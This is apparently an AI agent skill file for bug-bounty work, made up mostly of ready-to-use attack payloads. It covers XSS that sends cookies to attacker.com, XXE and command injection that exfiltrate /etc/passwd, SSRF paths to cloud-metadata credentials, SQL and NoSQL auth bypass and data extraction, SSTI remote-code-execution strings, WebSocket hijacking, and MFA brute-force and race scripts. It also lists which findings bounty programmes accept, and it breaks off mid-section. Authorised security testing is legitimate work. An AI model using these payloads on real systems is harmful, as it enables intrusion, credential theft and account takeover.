---
name: security-arsenal
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit.
---

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind SQLi (time-based confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (out-of-band confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (filename injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

### Universal Probe (send all, observe which evaluate)
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Where to Test
```
Name/bio/username fields, email subject templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (no rate limit)
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### Pattern 2: OTP Reuse (token not invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### Pattern 3: Response Manipulation
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### Pattern 4: Code Predictability
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### Pattern 5: Backup Codes Not Rate Limited
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### Pattern 6: Skip MFA Step (Workflow Bypass)
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### Pattern 7: Race on MFA Verification
```python
import asyncio, aiohttp

# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()

async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)

asyncio.run(race())
```

---

## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID>user@company.com</NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Original: user@company.com -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: admin@company.com -->
<!-- SAML validator sees "user@company.com" (before comment) -->
<!-- Application uses "admin@company.com" (after comment stripped) -->
```

### Attack 3: Signature Stripping
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to admin@company.com
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### Tools
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

## GF PATTERN NAMES (tomnomnom/gf)

```bash
# Install: https://github.com/tomnomnom/gf
# Usage: cat urls.txt | gf PATTERN

gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## ALWAYS REJECTED — NEVER SUBMIT

Submitting these destroys your validity ratio. N/A hurts. Don't.

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC)
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## CONDITIONALLY VALID — REQUIRES CHAIN

These are valid ONLY when combined with a chain that proves real impact:

| Standalone Finding | Chain Required | Result if Chained |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC (not just login) | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (transfer funds, change email) | High |
| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host header injection | + password reset email uses it | High |
| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
| S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger it on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |

**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.

---

## WORDLISTS (Installed in ~/wordlists/)

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### Built-in Paths Worth Fuzzing

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```

---

## ADVANCED XSS PAYLOADS AND TECHNIQUES

### Filter Bypass Techniques

```javascript
// Tag bypasses
<script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
<scr</script>ipt>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>

// Event handler variations
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<iframe src="javascript:alert(1)">

// Encoding bypasses
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&quot;alert(1)&quot;>

// Case variation
<ImG sRc=X OnErRoR=aLerT(1)>
<SCRIPT>alert(1)</SCRIPT>

// Whitespace tricks
<img src=x onerror=alert(1) >
<img src=x
onerror=alert(1)>

// Comment injection
<img src=x onerror="/*alert(1)*/alert(1)">
```

### XSS Context Detection

```javascript
// HTML context (between tags)
<div>USER_INPUT</div>
// Payload: <script>alert(1)</script>

// HTML attribute context
<div id="USER_INPUT"></div>
// Payload: " onload=alert(1) x="

// JavaScript context
<script>var x = 'USER_INPUT';</script>
// Payload: ';alert(1);var x='

// URL context
<a href="USER_INPUT">link</a>
// Payload: javascript:alert(1)

// CSS context
<style>body { background: url(USER_INPUT); }</style>
// Payload: }</style><script>alert(1)</script>
```

### Mutation XSS (mXSS)

```javascript
// Browser re-parsing sanitized input
// Sanitizer removes onerror but browser re-parses:
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// MathML mXSS
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->

// SVG mXSS
<svg><style><img src=x onerror=alert(1)>
```

---

## ADVANCED SSRF PAYLOADS AND TECHNIQUES

### Protocol Smuggling

```bash
# Gopher protocol (Redis, Memcached, etc.)
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aGET%0d%0a*3%0d%0a%243%0d%0akey%0d%0a

# File protocol
file:///etc/passwd
file:///proc/self/environ

# Dict protocol
dict://127.0.0.1:6379/INFO

# SFTP
sftp://attacker.com/

# LDAP
ldap://127.0.0.1:389/dc=example,dc=com
```

### Cloud Metadata Deep Dive

**AWS Complete Paths:**
```bash
# IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# User data (EC2 startup script, may contain secrets)
http://169.254.169.254/latest/user-data/

# Network interfaces (internal IP mapping)
http://169.254.169.254/latest/meta-data/network/interfaces/

# Instance identity
http://169.254.169.254/latest/dynamic/instance-identity/document

# Placement (AZ info)
http://169.254.169.254/latest/meta-data/placement/availability-zone

# Public keys
http://169.254.169.254/latest/meta-data/public-keys/

# Account ID
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
```

**GCP Complete Paths:**
```bash
# Access token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Service account info
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id

# SSH keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

**Azure Complete Paths:**
```bash
# Managed identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
Header: Metadata: true

# Instance metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

### Internal Service Exploitation

```bash
# Redis (unauthenticated)
http://localhost:6379/
# Commands via HTTP (url-encoded):
INFO
KEYS *
GET session:*
CONFIG GET *

# Elasticsearch
http://localhost:9200/_cat/indices
http://localhost:9200/_search?pretty
http://localhost:9200/_cluster/health

# MongoDB (binary protocol, check for connection refused vs timeout)
http://localhost:27017/

# Docker API
http://localhost:2375/containers/json
http://localhost:2375/images/json
http://localhost:2375/version

# Kubernetes API
http://localhost:10.96.0.1:443/api/v1/namespaces/default/pods
http://localhost:8080/api/v1/nodes

# Jenkins
http://localhost:8080/script
http://localhost:8080/scriptText
# Groovy script execution: scriptText?script=request%3D%22ls%22

# Spring Boot Actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/beans
http://localhost:8080/actuator/mappings
```

### Blind SSRF Techniques

```bash
# DNS-based (low value alone)
http://UNIQUE_ID.burpcollaborator.net

# Time-based
http://slow-internal-service:8080/  # longer response time = service exists

# Error-based
http://internal-service:8080/nonexistent  # different error = different service

# Port scanning via response time
for port in 22 80 443 3306 5432 6379 9200 2375; do
    curl -s -o /dev/null -w "%{time_total}" "http://target.com/scan?host=127.0.0.1&port=$port"
done
```

---

## ADVANCED SQL INJECTION

### Database Fingerprinting

```sql
-- MySQL
SELECT version()  -- Returns MySQL version
SELECT database()  -- Returns current database
SELECT user()     -- Returns current user

-- PostgreSQL
SELECT version()
SELECT current_database()
SELECT current_user
SELECT pg_catalog.pg_tables()  -- List tables

-- MSSQL
SELECT @@version
SELECT DB_NAME()
SELECT SYSTEM_USER

-- Oracle
SELECT banner FROM v$version
SELECT user FROM dual
SELECT table_name FROM all_tables
```

### Advanced Union-Based Extraction

```sql
-- Determine column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data once column count known
' UNION SELECT username,NULL,NULL FROM users--
' UNION SELECT password,NULL,NULL FROM users--
' UNION SELECT username,password,email FROM users--

-- Extract from multiple tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi Boolean-Based

```sql
-- MySQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--

-- PostgreSQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND EXISTS(SELECT * FROM users WHERE username LIKE 'a%')--

-- MSSQL
' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a'--
' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0--
```

### Blind SQLi Time-Based

```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
' IF(SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a' WAITFOR DELAY '0:0:5'--
```

### SQLi WAF Bypass Complete List

```sql
-- Comment variations
/**/SELECT/**/*/**/FROM/**/users
/*!50000 SELECT*/ * FROM users
SELECT/*comment*/FROM/*comment*/users

-- Space alternatives
SELECT%0a*%0d%0aFROM%09users
SELECT+username+FROM+users

-- Case variation
SeLeCt FrOm uSeRs
sElEcT uSeRnAmE FrOm UsErS

-- String concatenation (MySQL)
CONCAT('a','d','m','i','n')
'admin' LIKE 'a%'

-- Boolean encoding
1=1
1=1#
1=1--
1=1/*

-- Time-based with conditions
' AND SLEEP(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 5 ELSE 0 END)--
```

---

## ADVANCED NOSQL INJECTION

### MongoDB Operator Reference

```json
// Comparison operators
{"$eq": "value"}      // Equal
{"$ne": "value"}      // Not equal
{"$gt": "value"}      // Greater than
{"$gte": "value"}     // Greater or equal
{"$lt": "value"}      // Less than
{"$lte": "value"}     // Less or equal
{"$in": ["val1","val2"]}  // In array
{"$nin": ["val1"]}   // Not in array

// Logical operators
{"$and": [...]}       // Logical AND
{"$or": [...]}        // Logical OR
{"$not": {...}}       // Logical NOT
{"$nor": [...]}       // Logical NOR

// Element operators
{"$exists": true}    // Field exists
{"$type": "string"}  // Field type

// Evaluation operators
{"$where": "this.password == 'admin'"}  // JavaScript expression
{"$regex": "^admin"}  // Regex match
{"$text": {"$search": "admin"}}  // Text search

// Array operators
{"$size": 5}         // Array size
{"$all": ["a","b"]}  // Array contains all
{"$elemMatch": {...}}  // Array element match
```

### NoSQLi Payloads Advanced

```json
// Authentication bypass (MongoDB)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$gt": ""}, "$where": "1==1"}
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}

// Data extraction via regex
{"username": {"$regex": "^a"}}  // First char is 'a'
{"username": {"$regex": "^ad"}}  // First 2 chars
{"username": {"$regex": "^adm"}}  // First 3 chars

// Blind extraction via timing
{"username": {"$eq": "admin"}, "$where": "sleep(5000)"}
{"username": {"$eq": "admin"}, "$where": "this.password.match(/^a/) && sleep(5000)"}

// Type confusion
{"username": {"$eq": {"$eq": 1}}}
{"username": [null], "password": [null]}

// JavaScript injection in $where
